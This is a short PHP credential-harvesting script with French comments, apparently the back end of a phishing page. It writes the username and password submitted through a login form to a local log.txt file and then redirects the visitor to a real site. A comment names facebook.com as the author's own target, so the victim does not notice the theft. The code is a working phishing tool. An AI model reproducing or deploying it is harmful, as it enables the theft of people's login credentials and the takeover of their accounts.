<?php // Ce script va ouvrir un fichier log.txt, inscrire les données du formulaire et refermer le fichier.
$fp = fopen ("log.txt", "a");
fputs($fp, "\n");
fputs ($fp, "login : ".$_POST['username']);
fputs ($fp, " / password : ".$_POST['password']);
fclose ($fp);
?>
<?php // Ce script va faire une redirection automatique vers l'adresse de mon choix (ici : developer.yahoo.com/hacku)
header('Location: http://developer.yahoo.com/hacku/index.html'); // dans mon cas http://www.facebook.com
exit;
?>